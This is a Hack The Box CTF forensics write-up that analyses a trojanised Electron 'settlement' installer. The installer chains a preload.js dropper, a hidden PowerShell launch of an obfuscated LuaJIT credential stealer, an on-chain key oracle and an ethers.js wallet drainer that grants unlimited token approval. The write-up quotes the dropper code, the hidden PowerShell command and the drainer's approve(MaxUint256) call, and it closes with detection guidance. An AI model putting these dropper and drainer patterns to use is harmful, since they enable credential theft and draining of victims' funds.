---
type: writeup
title: "HTB Holmes 2026 — Silent Dividend: Electron Preload Dropper with On-Chain Key Oracle"
platform: Hack The Box
event: "Holmes CTF 2026: The Reichenbach Directive"
challenge: Silent Dividend
category: forensics
subcategory: sherlock-dfir
difficulty: medium
points: 800
status: complete
app: "TrustSettle 1.0.0.exe — trojanised Electron settlement client, NSIS-packaged, 95 MB"
mitre:
  - T1204.002
  - T1059.001
  - T1105
  - T1027
  - T1140
  - T1083
  - T1552.001
  - T1071.001
  - T1102.001
  - T1657
tags:
  - writeup
  - HTB
  - Security
  - DFIR
  - Malware_Analysis
  - Incident_Response
  - forensics
  - Reverse_Engineering
related:
  - "[[HTB]]"
aliases:
  - Silent Dividend
  - Holmes 2026 Silent Dividend
created: 2026-09-20T09:29:21.111Z
updated: 2026-09-20T09:29:21.111Z
---

# Silent Dividend — Electron Preload Dropper, LuaJIT Implant, On-Chain Key Oracle

> [!success] Solved — 2026-09-18 17:29 (platform clock) · 10 of 10 flags
> **No `HTB{}` string exists for this room** — it is question-graded. The final answer, recovered from the drainer contract, is `51.5049,0.0348`.
> Sherlock 01 of the event · medium · 800 points at completion.

> [!info] Scenario, verbatim
> 1 - Silent Dividend
> The story will unfold through the PDFs provided with each challenge's downloadable ZIP.
>
> All characters, locations, and events are fictional. Any resemblance to real people, places, or events is purely coincidental.
>
> **Supplied artifact:** `SilentDividend.zip` → `DANGER.txt`, `Holmes CTF 2026 Sherlock 01.pdf`, `danger.zip` (password-protected, containing `README.md` and `TrustSettle 1.0.0.exe`).

---

## Flags — Answers

| # | Question | Answer | Method |
|---|---|---|---|
| 1 | Directory the app copies `extraResources` into | `C:\Users\Public` | `preload.js`, extracted from `app.asar` |
| 2 | Win32 structure defining the directory-change buffer | `FILE_NOTIFY_INFORMATION` | `ffi.cdef` block captured from the Lua stage |
| 3 | Win32 API used to send the HTTP request | `WinHttpSendRequest` | same `cdef` block; `ffi.load("winhttp")` |
| 4 | Contract function retrieving the decryption key | `resolveState()` | `preload.js` ABI literal; selector `0x77b3774c` |
| 5 | Flag from decoding the encrypted payload | `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821` | `eth_call` → bytes32 key → offline decrypt |
| 6 | Env var for the directory the HTML is copied to | `%TEMP%` | proven by the decrypted command, not by packaging convention |
| 7 | Token function requesting spending permission | `approve()` | `settlement.html` ABI |
| 8 | Exact token amount in the approval call | `115792089237316195423570985008687907853269984665640564039457584007913129639935` | `ethers.MaxUint256` |
| 9 | ethers.js v6 provider class for the browser wallet | `BrowserProvider` | `new ethers.BrowserProvider(window.ethereum)` |
| 10 | Hidden flag in the HTML-referenced contract | `51.5049,0.0348` | `x7()` → hidden owner → `x9(address)` |

---

## 0. How the flag was obtained

1. Unpacked the outer ZIP; read `DANGER.txt` for the inner archive password and `danger.zip` for `TrustSettle 1.0.0.exe` (95,492,030 B).
2. Identified the binary as an **NSIS installer** wrapping an electron-builder payload; extracted `$PLUGINSDIR/app-64.7z` with `7z`, then `resources/app.asar` and `extraResources/`.
3. Parsed `app.asar` with a read-only Python parser (header JSON + offset table) — the app's own code is six files; everything else is `node_modules`.
4. **Read `preload.js` — the entire dropper is here.** It copies `extraResources` to `C:\Users\Public`, spawns a hidden PowerShell that runs `luajit.exe api.txt`, writes `settlement.html` two directories above `resourcesPath`, and fetches a decryption key from a Sepolia contract.
5. Recovered the key with one `eth_call` to `resolveState()` (selector `0x77b3774c`) and decrypted the embedded blob offline with a reimplementation of the cipher.
6. Ran `api.txt` under an **instrumented LuaJIT harness** with `ffi` replaced by a logging proxy — this printed the full `cdef` block, answering flags 2 and 3 without a single Win32 call resolving.
7. Read `settlement.html` for the wallet-drainer UI: `BrowserProvider`, `approve(spender, MaxUint256)`, and two contract addresses.
8. Pulled the drainer contract's runtime bytecode with `eth_getCode` and disassembled it offline with `pyevmasm`.
9. **Recovered the hidden owner as `storage[1] XOR storage[2]`** — neither slot alone is an address — and passed it to `x9(address)`, which returned the coordinate pair.

---

## 1. Shape of the challenge

A four-stage chain, each stage in a different language and a different analysis discipline:

| Stage | Artifact | Discipline |
|---|---|---|
| Dropper | `preload.js` inside `app.asar` | Electron/NSIS unpacking, JS review |
| Implant | `api.txt` run by bundled `luajit.exe` | obfuscated LuaJIT, FFI tracing |
| Key oracle | Sepolia contract `0xbB63Ae28…` | on-chain read, custom cipher |
| Monetisation | `settlement.html` + drainer contract | ethers.js review, EVM disassembly |

The structural fact that makes this room different from a normal malware Sherlock: **the malware ships no C2 configuration.** The key that unlocks its payload is a `bytes32` read from a public blockchain at runtime. The binary is inert until the operator writes state on-chain, and the operator can change the executed command without redistributing the installer.

`extraResources` is the tell. A stock Electron app has no reason to bundle `luajit.exe` and `lua51.dll`.

---

## 2. Stage 1 — the Electron preload dropper

`preload.js` runs at window creation, before any user interaction. Three actions:

```javascript
// 1. drop the toolchain
fs.copyFileSync(path.join(process.resourcesPath, 'extraResources', f),
                path.join('C:\\Users\\Public', f));

// 2. execute the Lua stage, hidden
"powershell.exe -exec bypass -w hidden -nop -c \"& 'C:\\Users\\Public\\luajit.exe' 'C:\\Users\\Public\\api.txt'\""

// 3. stage the drainer UI
path.resolve(`${process.resourcesPath}/../../settlement.html`)
```

Dropped set: `luajit.exe`, `lua51.dll`, `api.txt` (66,870 B, obfuscated), `.env` (0 bytes).

The empty `.env` pairs with the bundled `README.md`, which instructs the user to write their wallet private key into it. That is the credential-theft primitive; the Lua stage is what collects it.

---

## 3. Stage 2 — the LuaJIT implant

`api.txt` is a Prometheus-class obfuscated LuaJIT script: a custom bytecode VM with an encoded string table. No literal string in it is readable, so `strings` and `grep` on the installer return nothing useful — the file is inside an LZMA-compressed 7z inside NSIS, and even once extracted every string is encoded.

Two encodings were ported statically to Python:

| Prefix | Scheme | Alphabet |
|---|---|---|
| `Q` | base64, custom alphabet | `wVI3QRmGATM7DnPXHZsC8cENget1Y4yjxr6oBkS0+bulUpaLhOFJKvWfq2iz/d95` |
| `n` | base-85, 5 chars → 4 bytes | 85-entry char map |

That recovered Lua library names, the string `Tamper Detected!`, and ~20 opaque 12–15 char tokens — **but no Win32 names.** The operational strings sit behind a further per-string layer decrypted inside the VM dispatch loop.

**The dynamic route answered it instead.** Running the script under a stubbed FFI printed the declarations verbatim:

```c
BOOL ReadDirectoryChangesW(HANDLE, void*, DWORD, BOOL, DWORD, DWORD*, void*, void*);
typedef struct {
    DWORD NextEntryOffset;
    DWORD Action;
    DWORD FileNameLength;
    WCHAR FileName[1];
} FILE_NOTIFY_INFORMATION;

HINTERNET WinHttpOpen(...);  HINTERNET WinHttpConnect(...);
HINTERNET WinHttpOpenRequest(...);  BOOL WinHttpSendRequest(...);
```

Observed behaviour: `ffi.load("winhttp")` → `ffi.load("kernel32")` → `CreateFileW` on `C:\users\public\` → `io.open` on `C:\users\public\.env` → `ReadDirectoryChangesW` watch loop.

**The implant watches the drop directory and reads `.env` the moment anything lands there**, then exfiltrates over WinHTTP. No WinHTTP call fired under the harness because the stubbed handle never produced a change event, which is also why the C2 hostname was never observed.

---

## 4. Stage 3 — the on-chain key oracle

```
contract  0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1   (Ethereum Sepolia)
function  resolveState() -> bytes32                     selector 0x77b3774c
RPC       https://ethereum-sepolia-rpc.publicnode.com
key       0x3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4
```

Cipher, from `decryptEmbeddedData()`:

```
step1 = ciphertext[i] ^ key[i % 32]
step2 = rotl8(step1, 7)
plain = step2 ^ 0x42
```

Decrypted, 84 bytes:

```
start "" "%TEMP%\settlement.html" && echo AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

This single string answers two flags: the flag itself (bytes 42–83) and flag 6 — `%TEMP%` is where the HTML is written, so `resourcesPath/../..` resolves under `%TEMP%`, not the per-user Programs directory that electron-builder's default install layout would imply.

> [!note] The cipher is weaker than it looks
> `rotl8` is a bit permutation, so it is linear over XOR. The construction collapses to plain repeating-key XOR on `rotl8(ciphertext, 7)`. With the answer-format mask as a crib, the flag's position was pinned to bytes 42–83 out of 43 candidate offsets, and several key bytes fell out uniquely — enough to predict `T` at flag index 2, `N` at 5, `R` at 36 and a digit tail, all of which the on-chain key later confirmed. The on-chain read is the intended path; the offline attack is the cross-check.

---

## 5. Stage 4 — the wallet drainer

`settlement.html` is a plain ethers.js v6 page. The variable naming is not subtle — the UI element is `drainerAddrDisplay`.

```javascript
const X0_CONTRACT_ADDRESS = "0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D";
const MOCK_TOKEN_ADDRESS  = "0x6B2B0C0d0a376255Ac70Bf1366f50982bF476Bb2";

provider = new ethers.BrowserProvider(window.ethereum);
const tx = await token.approve(X0_CONTRACT_ADDRESS, ethers.MaxUint256);
```

Unlimited approval to an attacker-controlled spender is the whole monetisation step — no transfer happens in the page, because the spender can drain at leisure afterwards.

### The drainer contract

3,796 bytes of runtime bytecode, unverified source. Five real selectors after discarding `PUSH`-adjacent noise:

| Selector | Signature | Behaviour |
|---|---|---|
| `0x0bfac020` | `x8(bytes)` | one-shot setter, reverts `already set` |
| `0x282940a7` | `x7()` | returns `storage[2] ^ storage[1]` as an address |
| `0x343943bd` | `x1()` | returns the mock token address |
| `0x8f7f391e` | `x11(address)` | guarded by `only hidden owner` |
| `0xf8e6e11f` | `x9(address)` | returns a string, or reverts `not quite - keep analyzing` |

Three revert strings recovered with `strings` over the decoded bytecode gave the shape of the puzzle before any disassembly.

The hidden-owner derivation at `0x163`, raw bytes `5f 6002 54 5f 1c 6001 54 5f 1c 18`:

```
PUSH0; PUSH1 0x02; SLOAD; PUSH0; SHR; PUSH1 0x01; SLOAD; PUSH0; SHR; XOR
```

The `SHR 0` pair are no-ops from a `uint256`→`address` cast. **Neither slot is an address on its own** — slots 1 and 2 share their first 16 bytes, which cancel in the XOR:

```
slot 1  0x7ccb3a440e383635148b237df8bb22dff0b594425beae88d6e1623df0bc7669b
slot 2  0x7ccb3a440e383635148b237d13473c069ba9ffd6545c58ee37e969b87d181c01
x7()    0xebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a
```

`x9` compares its **argument**, not `msg.sender`, so no account control is needed. Slot 3 holds the answer as an encrypted Solidity short string — trailing byte `0x1c` = 28 = 2×14, i.e. 14 characters, matching the `**.****,*.****` answer mask exactly.

---

## 6. Blind alleys — eliminated, do not re-walk

- **`strings` on the installer for `cdef`.** Returns hits that are byte coincidences in LZMA-compressed data. `api.txt` is two containers deep and encodes every string regardless.
- **`PUSH17 0xcfc4a3f01344d906cc4f450b5954fe8721` as a keccak constant.** It sits inside the Solidity metadata trailer (`ipfsX` / `solcC`), not executable code. Cut the trailer before trusting any constant near the end of runtime bytecode.
- **Offline decryption of slot 3.** Tried address bytes, `keccak(address)`, ABI-padded `keccak`, raw slots, and slot XOR — none yields printable output. The key derivation is not visible in a static read of the getter path.
- **Selector grep anchored on `63` (`PUSH4`).** Produces six false positives (`0x565b6040`, `0x373fffff`, `0xffffffff` …). Confirm against the dispatcher's `EQ`/`JUMPI` chain.
- **`LOCALAPPDATA` for flag 6.** Correct for electron-builder's default per-user NSIS install, wrong for this sample. The decrypted command is the evidence.

---

## 7. Final payload

Reproduction, from the supplied ZIP to the last flag:

```bash
cd /home/kali/holmes_ctf
unzip SilentDividend.zip
unzip -P '<password from DANGER.txt>' danger.zip
7z x 'TrustSettle 1.0.0.exe' -oinstaller '$PLUGINSDIR/app-64.7z'
7z x 'installer/$PLUGINSDIR/app-64.7z' -opayload 'extraResources' 'src' 'resources/app.asar'
python3 asar_read.py payload/resources/app.asar extract /preload.js app

# stage 3 — key + payload
KEY=$(curl -s https://ethereum-sepolia-rpc.publicnode.com \
  -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":[{"to":"0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1","data":"0x77b3774c"},"latest"]}' | jq -r .result)
python3 trustsettle_decrypt.py "$KEY"

# stage 2 — FFI surface (SNAPSHOT VM)
luajit ffi_trace.lua payload/extraResources/api.txt 2>&1 | tee ffi_trace.log

# stage 4 — drainer
cast call 0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D "x7()(address)" \
  --rpc-url https://ethereum-sepolia-rpc.publicnode.com
cast call 0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D \
  "x9(address)(string)" 0xebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a \
  --rpc-url https://ethereum-sepolia-rpc.publicnode.com
```

---

## 8. Tools & techniques

`7z` (23.01) · `pyevmasm` · `pycryptodome` (keccak) · `luajit` · `cast` (Foundry) · `curl` + JSON-RPC · `jq` · `pdftotext` · custom `asar_read.py`, `trustsettle_decrypt.py`, `ffi_trace.lua`

**Concepts:** NSIS/electron-builder unpacking · ASAR format parsing · Electron preload as an execution primitive · LuaJIT FFI tracing via stubbed module · obfuscator string-table porting · linearity of bit-rotation over XOR · crib-dragging with an answer-format mask · EVM selector dispatch and storage-slot reading · dead-drop resolver on a public blockchain

---

## 9. MITRE ATT&CK

| Technique | ID | Evidence |
|---|---|---|
| User Execution: Malicious File | T1204.002 | victim runs `TrustSettle 1.0.0.exe`, a purpose-built fake settlement client |
| Command and Scripting Interpreter: PowerShell | T1059.001 | `powershell.exe -exec bypass -w hidden -nop -c` |
| Ingress Tool Transfer | T1105 | `luajit.exe`, `lua51.dll`, `api.txt` written to `C:\Users\Public` |
| Obfuscated Files or Information | T1027 | Prometheus-class LuaJIT VM; two custom string encodings |
| Deobfuscate/Decode Files or Information | T1140 | runtime decrypt of the embedded blob with an on-chain key |
| File and Directory Discovery | T1083 | `ReadDirectoryChangesW` watch on the drop directory |
| Unsecured Credentials: Credentials In Files | T1552.001 | `.env` staged empty, `README.md` instructs the user to write a private key into it |
| Application Layer Protocol: Web Protocols | T1071.001 | WinHTTP session chain declared in the FFI block |
| Web Service: Dead Drop Resolver | T1102.001 | `resolveState()` supplies the payload key from public chain state |
| Financial Theft | T1657 | unlimited `approve()` to an attacker-controlled drainer contract |

> [!warning] Honest scope
> IDs assigned without access to the live ATT&CK matrix. **T1083 is the weakest** — `ReadDirectoryChangesW` here is a trigger for credential collection, not reconnaissance, and ATT&CK has no technique for "watch a directory and read whatever appears." T1102.001 is the closest fit for the on-chain key oracle, but Dead Drop Resolver describes C2 address resolution, not key distribution; the mapping is by analogy. No technique covers the wallet-approval primitive itself — T1657 captures the effect, not the mechanism.

---

## 10. Detection / blue-team & fix notes

**Detection.** The chain is loud once you know where to look:

- Any Electron app writing to `C:\Users\Public` then spawning `powershell.exe -w hidden` from its own install tree.
- `luajit.exe` / `lua51.dll` on a workstation — no legitimate desktop app ships a standalone Lua JIT alongside an Electron runtime.
- Outbound to public Ethereum RPC endpoints from a process that is not a wallet.
- `ReadDirectoryChangesW` on `C:\Users\Public` from a non-system process.
- Process lineage `TrustSettle.exe` → `powershell.exe` → `luajit.exe`.

**Fix, at the class level.** Electron preload scripts run with Node integration before the renderer loads and are an execution primitive, not a UI convenience — audit `preload.js` and `extraResources` in any packaged Electron app before deployment, and treat an unexpected native binary in `extraResources` as disqualifying. On the wallet side, the durable fix is not user education about `approve()` but spend caps: never grant `MaxUint256` to a contract, and prefer allowance-per-transaction.

**On the on-chain oracle.** Key material fetched from immutable public state cannot be revoked by takedown. Blocklisting the RPC endpoint only pushes the operator to another provider; the contract itself is the durable indicator and is worth monitoring rather than reporting.

---

## 11. Method notes

- **The offline crypto work was the wrong first move.** Pinning the flag offset by mask-crib was satisfying and predicted four characters correctly, but one `eth_call` produced the whole string. Cost: several analysis cycles for a cross-check.
- **Static-only was the right default and the wrong finish.** Two flags were locked behind an obfuscator that decrypts strings inside its own VM. The instrumented harness answered both in minutes; porting the string decoders statically answered neither. Decide early whether a layer is reachable statically, and stub-and-run when it is not.
- **A shell placeholder cost a turn.** `python3 tool.py <result>` was pasted literally into zsh, which read `<` as redirection.
- **Wrong directory, wrong conclusion.** `luajit ffi_trace.lua` was run from a path where neither file existed; the 96-byte log looked like a harness failure rather than a missing input.

---

## 12. Open items

1. **C2 hostname unrecovered.** It is an argument to `WinHttpConnect`. The harness logs calls but not decrypted argument values — extending it to dump arguments would close this.
2. **`api.txt` per-string layer not broken.** Both outer encodings are ported; the inner per-string decryption inside the VM dispatch loop is not.
3. **Slot-3 key derivation unknown.** `x9` decrypts on-chain; the derivation is not visible in a static read of the getter path.
4. **`category` field unverified** — set to `forensics` by analogy with the Remnant Sherlock, not read off the Holmes platform page. Confirm and correct.
5. **`solves` omitted** — not read off the platform.
6. **Inner-archive password** deliberately not recorded in this note; it is in `DANGER.txt` in the supplied ZIP.
7. **Platform display changed between two reads.** First read: `975` points, pwned `18 Sep, 2026 06:10`. Second read: `800` points, pwned `18 Sep, 2026 17:29`. The later values are recorded here. HTB point values decay as solve counts rise, which accounts for 975 → 800; the 11-hour shift in the pwn timestamp is unexplained and may be a display-timezone difference. Neither reading was verified against a second source.

---

## Cross-references

- [[HTB-CA2026-Remnant-TLS-Decrypt-C2-DFIR]] — category sibling; the prior Sherlock-class DFIR note, and the source of the "decrypt every channel" discipline applied here
- [[00_ctf-writeup-standard]] — structure this note conforms to
- [[HTB]]

---

## Change Log

- 2026-09-20 — Note created. All ten flags solved and recorded; event scenario captured verbatim. `category` marked unverified pending a read of the platform page (§12.4).
- 2026-09-20 — Pre-placement correction from a second read of the platform page: `points` 975 → 800, solve time 06:10 → 17:29. See §12.7 on the discrepancy.
